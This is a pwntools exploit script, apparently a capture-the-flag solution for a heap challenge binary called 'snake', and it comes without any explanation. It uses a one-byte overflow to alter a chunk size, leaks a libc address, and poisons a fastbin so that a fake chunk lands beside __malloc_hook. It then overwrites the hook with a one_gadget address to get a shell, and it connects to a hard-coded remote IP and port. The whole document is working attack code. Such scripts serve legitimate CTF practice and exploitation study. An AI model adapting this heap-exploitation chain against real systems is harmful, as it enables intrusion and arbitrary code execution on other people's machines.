from pwn import *
context.log_level='debug'
exe = './snake'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
one = [0x45216, 0x45216, 0xf02a4, 0xf1147]
elf = ELF(exe)
p=process(exe)
p=remote('39.107.244.116',9999)

def leave_words(text):
	p.sendafter("please leave words:\n",text)

def exit(index):
	p.sendlineafter("if you want to exit?\n",index)

def menu(idx):
	p.sendlineafter("4.start name\n",str(idx))

def add(index,lenght,name):
	menu(1)
	p.sendlineafter("index?\n",str(index))
	p.sendlineafter("how long?\n",str(lenght))
	p.sendlineafter("name?",name)

def delete(index):
	menu(2)
	p.sendlineafter("index?",str(index))

def get(index):
	menu(3)
	p.sendlineafter("index?",str(index))

def start():
	menu(4)

def pwn():
	p.sendlineafter("how long?\n",str(0x40))
	p.sendlineafter("input name","AAAAAAAAAAAAAAAA")
	p.sendline()
	for i in range(0x23):
		p.sendline()
	leave_words("A"*76+'\x91')
	p.sendline('n')
	add(1,0x60,p64(0x31)*8)
	
	add(2,0x60,'/bin/sh\x00')
	delete(0)
	add(0,0x60,'AAAAAAA')
	start()
	p.recvuntil("AAAAAAA\n")
	leak= u64(p.recv(6).ljust(8,'\x00'))
	success('libc-->'+hex(leak))
	libc.address = leak-0x3c4bf8
	success('libc.address-->'+hex(libc.address))
	mallochook=libc.sym['__malloc_hook']
	success("mallo_chook-->"+hex(mallochook))
	fakechunk=mallochook-0x23

	for i in range(0x23):
		p.sendline()

	p.sendline('AAAA')
	p.sendlineafter("if you want to exit?\n",'n')

	delete(1)
	delete(0)

	add(0, 0x60,'BBBBBBBB'*9+p64(0x71)+p64(fakechunk))
	add(0, 0x60,'funk')
	add(0, 0x60,'AAA'+"BBBBBBBB"*2+p64(libc.address+one[3]))

	menu(1)
	p.sendlineafter("index?",str(3))
	p.sendline(str(1))
	# raw_input("111")
	# gdb.attach(p)



	

	p.interactive()

pwn()